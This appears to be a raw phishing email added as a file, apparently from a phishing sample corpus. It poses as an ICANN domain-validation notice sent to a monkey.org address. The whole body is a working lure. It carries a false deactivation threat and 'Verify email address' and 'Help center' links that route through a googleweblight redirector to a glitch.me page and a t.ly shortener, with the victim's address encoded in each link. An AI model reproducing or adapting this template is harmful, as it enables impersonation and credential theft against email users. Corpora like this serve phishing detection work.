@@ -1,0 +1,197 @@
+Return-Path: icann.org@bakmacf.com
+Delivered-To: jose@monkey.org
+X-FDA: 82027191582.19.0D3F900
+Received: from mail.bakmacf.com (mail.bakmacf.com [193.27.90.129])
+	by imf29.b.hostedemail.com (Postfix) with ESMTP id 6CECD120002
+	for <jose@monkey.org>; Fri, 19 Apr 2024 18:58:09 +0000 (UTC)
+Authentication-Results: imf29.b.hostedemail.com;	dkim=pass
+ header.d=bakmacf.com header.s=default header.b=LaRqnzKc;	spf=pass
+ (imf29.b.hostedemail.com: domain of icann.org@bakmacf.com designates
+ 193.27.90.129 as permitted sender) smtp.mailfrom=icann.org@bakmacf.com;
+	dmarc=pass (policy=reject) header.from=bakmacf.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1713553089;
+	h=from:from:sender:reply-to:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:content-transfer-encoding:in-reply-to:	
+ references:list-unsubscribe:dkim-signature;
+	bh=WQOVuwqSZPo25VzPJvg/GSEhZWVoHYMWOW2o6na3elM=;
+	b=vCmcZYipiXqf8COSN4bqY7mbqIlplpkI+8KV2PYfRBR1EmFImMEPFESkwOBcb2wP5zJVK1
+	/juCms8r1j3JV1JeW227p65KzL8wTmPf07VZgYKAj9Ba+19OcDgsaCztM5orkUVTZRvY41
+	+5Wgymfu6+hmLwfIh2ySQGvhzgTXqZs=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1713553089; a=rsa-sha256;
+	cv=none;
+	b=8nU59uw6QQgNe1GGgk6+4TNXWCeQ5Rl/J9lNZ7fEMcWH87Kv735d/7Ribk8AnVYRMPSJzd
+	19o/5Dy5d2ogHDVpdjp/GCoRTcchn362WZnDlsPAkEn4Wp7MBtpWSJeL2OezLkpo+OKtCS
+	TWObEP2bb4UgOXsmGvJ5tnWwIZOAqQM=
+ARC-Authentication-Results: i=1;	imf29.b.hostedemail.com;	dkim=pass
+ header.d=bakmacf.com header.s=default header.b=LaRqnzKc;	spf=pass
+ (imf29.b.hostedemail.com: domain of icann.org@bakmacf.com designates
+ 193.27.90.129 as permitted sender) smtp.mailfrom=icann.org@bakmacf.com;
+	dmarc=pass (policy=reject) header.from=bakmacf.com
+Received: from ip-129-22.dataclub.info (unknown [84.38.129.22])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+	(No client certificate requested)
+	by mail.bakmacf.com (Postfix) with ESMTPSA id B1296123C96
+	for <jose@monkey.org>; Fri, 19 Apr 2024 21:58:00 +0300 (EEST)
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed;
+	d=bakmacf.com; s=default; h=Reply-To:From:To:Subject:
+	MIME-Version:List-Unsubscribe:Organization:Content-Type; bh=STUu
+	md+BwDWLJlXQOX3ErfbrT6c=; b=LaRqnzKcWpidCqafCSEelN+nlidBOGde66Hr
+	G4fyUqatYO1NaYcHRAHpDwz+nP/vWKJuKw9hhC52dsIFUMhfRm4WWF59WYoJiWZA
+	VlpMsKwGmM19kwtP05a07pYLGRlOc9cMmUO1kamN4nGMJ0OiGR/hxr/UNr0iApge
+	KT57TVNIgRrsL+Nm5KW5sz2w9PPax+6xH8fx9X5pTTsT2XdxtN98tslgspviBQ3T
+	oJSjwdWyXRIA1P1dv+NY4DVOxGUOxNTS6ereAteA63+ykjvLIEYbOps7ZFWM/YSG
+	d0cTvzUvzz2Pv8kCkqfkNYY8EdAdVkzOHmlaxukG0i1X9pGJEQ==
+Reply-To: ICANN Domain Notice <reply-to@bakmacf.com>jose@monkey.org
+From: ICANN Domain Notice <icann.org@bakmacf.com>
+To: jose@monkey.org
+Subject: Domain owner validation for monkey.org user(s)
+Date: 19 Apr 2024 20:58:00 +0200
+Message-ID: <20240419205800.F7F4D859DA82C598@bakmacf.com>
+MIME-Version: 1.0
+List-Unsubscribe: <mailto:icann.org@bakmacf.com>
+Organization: Foobar Inc.
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_000_0012_15C9C860.337F299E"
+X-Rspamd-Queue-Id: 6CECD120002
+X-Spam-Status: No, score=2.72
+X-Stat-Signature: 33pjfwod9q4dh5obmoq6a8me5aicyk4t
+X-Rspamd-Server: rspam03
+X-Rspam-User: 
+X-HE-Tag: 1713553089-958443
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1/ocUoWW5pM1MW4LaRm+B4sU2VyOK0zP7+qoU6b/tvHbRw?=
+ =?utf-8?q?MLYxo3DW3BpUuANers0R3dB9cVx/0mjDI4a2xR+q3i0etbsgtjEhvwFWHU+QgXnHB?=
+ =?utf-8?q?lDGO4E8LbS1fJmegCNizkq02JoSkihMYpQADjhMbEPMObhnmuNNXmQ2SBSlw38m9h?=
+ =?utf-8?q?4NBfRM6xiTSi928MfgyzRmOeeXMJdiK6CE1gqgYMs+vO8wfGq0=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 116
+
+------=_NextPart_000_0012_15C9C860.337F299E
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+ICANN Data Directory Services
+
+
+Dear Registrant,
+
+The Internet Corporation for Assigned Names and Numbers (ICANN)=20
+has mandated that all ICANN accredited registrars begin verifying=20
+all email addresses registered for each domain name.
+
+The following Email:=C2=A0(jose@monkey.org)=C2=A0is associated with the=20
+Domain:=C2=A0(monkey.org)=C2=A0 and requires verification.
+
+Follow=C2=A0the=C2=A0prompt=C2=A0below to verify your email address and=20
+explicitly consent to the terms of our Registration Agreement.
+
+
+Verify email address=20
+(=C2=A0https://googleweblight.com/i?u=3Dhttps://checkered-workable-feels.gl=
+itch.me#am9zZUBtb25rZXkub3Jn=C2=A0)
+
+
+This link will expire in=C2=A03 days. If you did not make this=20
+request, please disregard this email.
+Otherwise, take required action to prevent deactivation of your=20
+domain address.
+=C2=A0
+For help, contact us through our=C2=A0Help center=20
+(=C2=A0https://googleweblight.com/i?u=3Dhttps://t.ly/CJqxp#am9zZUBtb25rZXku=
+b3Jn=C2=A0)=20
+=2E
+------=_NextPart_000_0012_15C9C860.337F299E
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/htm=
+l4/strict.dtd">
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta http-equiv=3D"content-type" content=3D"text/html; charset=3DISO-8859-=
+1">
+  <title></title>
+</head>
+<body>
+<div class=3D"v1main" style=3D"padding: 40px 20px; text-align: left; color:=
+ rgb(53, 55, 64); text-transform: none; line-height: 1.5; text-indent: 0px;=
+ letter-spacing: normal; font-family: Helvetica,Arial,sans-serif; font-size=
+: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; white-spac=
+e: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);">
+<h1 style=3D"margin: 0px 0px 20px; color: rgb(32, 33, 35); line-height: 40p=
+x; font-size: 32px;">
+<table style=3D"width: 598px; height: 271px; text-align: left; color: rgb(3=
+2, 33, 35); text-transform: none; letter-spacing: normal; font-family: Helv=
+etica, Arial, sans-serif; font-size: 32px; font-style: normal; font-weight:=
+ 500; word-spacing: 0px; white-space: normal; border-collapse: collapse; bo=
+x-sizing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 255=
+, 255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-=
+text-stroke-width: 0px; text-decoration-thickness:=20
+initial; text-decoration-style: initial; text-decoration-color: initial;" b=
+order=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing:=
+ border-box;"><tr style=3D"box-sizing: border-box;"><td style=3D"box-sizing=
+: border-box;">
+<h1 style=3D'margin: 0px; padding: 0px; text-align: left; color: rgb(36, 28=
+, 21); line-height: 36px; letter-spacing: normal; font-family: Georgia, Tim=
+es, "Times New Roman", serif; font-size: 28px; font-style: normal; font-wei=
+ght: 400; display: block; box-sizing: border-box;'>ICANN Data Directory Ser=
+vices<br style=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-=
+box;"></h1></td></tr><tr style=3D"box-sizing: border-box;">
+<td valign=3D"top" style=3D"margin: 0px; padding-bottom: 20px; box-sizing: =
+border-box;"><p style=3D'text-align: left; color: rgb(36, 28, 21); line-hei=
+ght: 24px; padding-top: 0px; font-family: "Helvetica Neue", Helvetica, Aria=
+l, Verdana, sans-serif; font-size: 16px; font-weight: 400; margin-top: 0px;=
+ margin-bottom: 1rem; box-sizing: border-box;'><strong style=3D"font-weight=
+: bolder; box-sizing: border-box;">Dear Registrant</strong>,<br><br style=
+=3D"box-sizing: border-box;">
+The Internet Corporation for Assigned Names and Numbers (ICANN) has mandate=
+d that all ICANN accredited registrars begin verifying all email addresses =
+registered for each domain name.<br style=3D"box-sizing: border-box;"><br s=
+tyle=3D"box-sizing: border-box;">The following Email:&nbsp;<span style=3D"b=
+ox-sizing: border-box;">(jose@monkey.org)&nbsp;</span>is associated with th=
+e Domain:<span style=3D"box-sizing: border-box;">&nbsp;(</span><span style=
+=3D"box-sizing: border-box;">monkey.org)&nbsp;</span>
+and requires verification.</p><p style=3D'text-align: left; color: rgb(36, =
+28, 21); line-height: 24px; padding-top: 0px; font-family: "Helvetica Neue"=
+, Helvetica, Arial, Verdana, sans-serif; font-size: 16px; font-weight: 400;=
+ margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;'>Follow&nbsp=
+;the&nbsp;prompt&nbsp;below to verify your email address and explicitly con=
+sent to the terms of our Registration Agreement.</p></td></tr></tbody></tab=
+le></h1>
+<p style=3D"margin: 24px 0px 0px; text-align: left;">
+<a title=3D"Verify email address" style=3D"background: 0% 50% rgb(16, 163, =
+127); margin: 0px; padding: 12px 20px 11px; color: white; line-height: 24px=
+; font-family: Helvetica,sans-serif; font-size: 16px; font-weight: 400; tex=
+t-decoration: none; -moz-background-clip: initial; -moz-background-origin: =
+initial; -moz-background-inline-policy: initial;" href=3D"https://googleweb=
+light.com/i?u=3Dhttps://checkered-workable-feels.glitch.me#am9zZUBtb25rZXku=
+b3Jn" target=3D"_blank" rel=3D"noreferrer">
+Verify email address</a></p>
+</div>
+<div class=3D"v1footer" style=3D"background: 0% 50% rgb(255, 255, 255); pad=
+ding: 0px 20px 20px; text-align: left; color: rgb(110, 110, 128); text-tran=
+sform: none; line-height: 1.4; text-indent: 0px; letter-spacing: normal; fo=
+nt-family: Helvetica,Arial,sans-serif; font-size: 13px; font-style: normal;=
+ font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; wido=
+ws: 2; -moz-background-clip: initial; -moz-background-origin: initial; -moz=
+-background-inline-policy: initial;">
+<p style=3D"margin: 0px;">This link will expire
+in&nbsp;3 days. If you did not make this request, please disregard
+this email.<br>Otherwise, take required action to prevent deactivation of y=
+our domain address.<br>&nbsp;<br>
+For help, contact us through our<span>&nbsp;</span><a style=3D"color: rgb(0=
+, 105, 166);" href=3D"https://googleweblight.com/i?u=3Dhttps://t.ly/CJqxp#a=
+m9zZUBtb25rZXkub3Jn" target=3D"_blank" rel=3D"noreferrer">Help center</a>.<=
+/p>
+</div>
+
+
+</body></html>
+------=_NextPart_000_0012_15C9C860.337F299E--
+
